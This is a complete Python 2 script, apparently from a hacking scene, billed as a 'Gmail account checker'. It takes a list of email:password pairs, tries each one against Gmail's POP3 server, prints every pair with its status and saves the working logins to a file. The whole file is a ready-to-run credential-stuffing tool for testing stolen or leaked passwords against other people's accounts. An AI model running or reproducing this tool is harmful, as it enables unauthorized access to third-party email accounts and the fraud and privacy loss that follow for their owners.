#!/usr/bin/python
# -*- coding: utf-8 -*-
# by ..:: crazyjunkie ::.. 2014
# Account Checker For Gmail

import sys, poplib

face = '''
     __                                           _             __   _    
    / /_  __  __   ______________ _____  __  __  (_)_  ______  / /__(_)__ 
   / __ \/ / / /  / ___/ ___/ __ `/_  / / / / / / / / / / __ \/ //_/ / _ \
  / /_/ / /_/ /  / /__/ /  / /_/ / / /_/ /_/ / / / /_/ / / / / ,< / /  __/
 /_.___/\__, /   \___/_/   \__,_/ /___/\__, /_/ /\__,_/_/ /_/_/|_/_/\___/ 
       /____/                         /____/___/                          
							Account checker
						..:: crazyjunkie ::..'''

help = '''
Usage: ./gmailchecker.py [gmaillist]
Ex : ./gmailchecker.py gmaillist.txt
\n* Account must be in the following format ~> username@gmail.com:password
'''
help = '''
Usage: ./gmailchecker.py [gmaillist]
Ex : ./gmailchecker.py gmaillist.txt
\n* Account must be in the following format ~> username@gmail.com:password
'''

if len(sys.argv) != 2:
    print (face)
    print (help)
    exit(1) 

#Change these if needed.
LOG = 'valid_gmail.txt'
HOST = 'pop.gmail.com'
PORT = 995
# Do not change anything below.
maillist = sys.argv[1]
valid = []
strline = 0  

try:
    handle = open(maillist)
except:
    print '\n[-] Could not open the accounts file. Check the file path and try again.'
    print '\n[-] Quitting ...'
    exit(1) 

for line in handle:
    strline += 1 

    try:
        email = line.split(':')[0]
        password = line.split(':')[1].replace('\n', '')
    except:
        print '\n[-] Erroneous account format at line %d.' % strline
        print '[!] Accounts must be in the following format : username@gmail.com:password'
        print '\n[-] Quitting ...'
        exit(1) 

    try:
        pop = poplib.POP3_SSL(HOST, PORT)
        pop.user(email)
        pop.pass_(password)
        valid.append(email + ':' + password)
        print '[+] Checking ~> username : [%s] password : [%s] status : Valid!' % (email, password)
        pop.quit()
    except:
        print '[+] Checking ~> username : [%s] password : [%s] status : invalid!' % (email, password)
        pass 

handle.close()
print '\n[+] Total Valid: %s' % len(valid) 

if len(valid) > 0:
    save = open(LOG, 'a') 

    for email in valid:
        save.write(email + '\n') 

    save.close()
    print '[+] The valid accounts are saved in "%s".' % LOG
    print '[+] Done.\n'

